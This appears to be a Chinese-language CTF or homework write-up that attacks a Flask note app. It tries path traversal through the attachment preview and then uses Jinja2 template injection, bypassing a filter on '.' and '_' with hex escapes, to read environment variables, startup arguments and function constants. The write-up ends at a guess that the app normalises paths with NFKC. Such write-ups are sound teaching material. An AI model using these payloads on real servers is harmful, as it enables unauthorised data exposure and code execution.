## 解題
##### 觀察
1. 觀察網站發現 Title、Note 可以建立筆記，建完的筆記會在 Your notes 的列表上
2. 嘗試建立筆記後，頁面提供 "草稿預覽" 和 "附件上傳" 兩個功能
   ![[HW1-1_note.png|507]]![[HW1-1_attachment.png|513]]
##### 測試路徑
上傳任意檔案 `tmp.txt`，可以在 `/attachments/preview?file=tmp.txt` 得到預覽檔案
-> 嘗試到上級資料夾：網址輸入 `/attachments/preview?file=../../../../../app/main.py` 
<div style="page-break-after: always;"></div>
![[HW1-1_badReq.png|center|342]]
-> 程式可能有路徑檢查機制
-> 分析後端確認路徑檢查機制

##### 測試 & 繞過 SSTI
1. 在 `Draft text` 中輸入 `{{7*7}}` 測試，發現存在 SSTI
   -> 測試其他 Jinja2 語法

	| 輸入                                                      | 結果                                        |
| ------------------------------------------------------- | ----------------------------------------- |
| `{{[10,20][0]}}`                                        | 10                                        |
| `{{'abc'\|attr('upper')()}}`                            | ABC                                       |
| `{{'a_b'}}`                                             | Template contains unsupported characters. |
| {{config}}                                              | 空白                                        |
| `{{cycler\|attr('\x5f\x5finit\x5f\x5f')}}`              | 空白                                        |
| {{(cycler\|attr('\x5f\x5finit\x5f\x5f')) is undefined}} | True                                      |

	-> 禁止輸入 `.`、`_`，用 `\x2e`、`\x5f` 可以繞過；限制存取 `__init__` 等私有屬性	
2. 獲取環境資訊
   ```bash
   {{'{0\x2e\x5f\x5finit\x5f\x5f\x2e\x5f\x5fglobals\x5f\x5f[os]\x2eenviron}'|attr('format')(cycler)}}
   ```
   ![[HW1-1_env.png|600]]
   成功取得環境變數，其中包含：
   
   - SAFENOTE_STORAGE=/app/storage
   - PWD=/app
   - SERVER_SOFTWARE=gunicorn/23.0.0

##### 後端程式
1. 讀參數 `__init__.__globals__['os'].sys.argv`
   ```bash
   {{'{0\x2e\x5f\x5finit\x5f\x5f\x2e\x5f\x5fglobals\x5f\x5f[os]\x2esys\x2eargv}'|attr('format')(cycler)}}
   ```
   
   <div style="page-break-after: always;"></div>
   
   -> `['/usr/local/bin/gunicorn', '--workers', '2', '--bind', '0.0.0.0:8000', 'main:app']`
   -> 使用 Gunicorn 啟動，且程式位於 main 
   
   
2. 查看 `main` 的檔案位置 `__init__.__globals__['os'].sys.modules['main'].__file__`
   ```bash
   {{'{0\x2e\x5f\x5finit\x5f\x5f\x2e\x5f\x5fglobals\x5f\x5f[os]\x2esys\x2emodules[main]\x2e\x5f\x5ffile\x5f\x5f}'|attr('format')(cycler)}}
   ```
   -> `/app/main.py`
3. 取得 main 的 objects `__init__.__globals__['os'].sys.modules['main'].app`
   ```bash
   {{'{0\x2e\x5f\x5finit\x5f\x5f\x2e\x5f\x5fglobals\x5f\x5f[os]\x2esys\x2emodules[main]\x2eapp}'|attr('format')(cycler)}}
   ```
   -> `<Flask 'main'>`
4. 無法直接讀取原始碼 -> 嘗試取得函式的用的常數  `__init__.__globals__['os'].sys.modules['main'].app.view_functions['preview_attachment'].__code__.co_consts`
   ```bash
{{'{0\x2e\x5f\x5finit\x5f\x5f\x2e\x5f\x5fglobals\x5f\x5f[os]\x2esys\x2emodules[main]\x2eapp\x2eview\x5ffunctions[preview\x5fattachment]\x2e\x5f\x5fcode\x5f\x5f\x2eco\x5fconsts}'|attr('format')(cycler)}}
   ```
   -> `(None, 'file', '', '..', ('/', '\\'), 400, 'NFKC', 'rb', 16777216, 404, 'application/octet-stream', ('mimetype',))`
   -> <mark style="background: #FFF3A3A6;">發現 NFKC</mark>  -> 推測附件預覽功能用 Unicode NFKC 正規化路徑
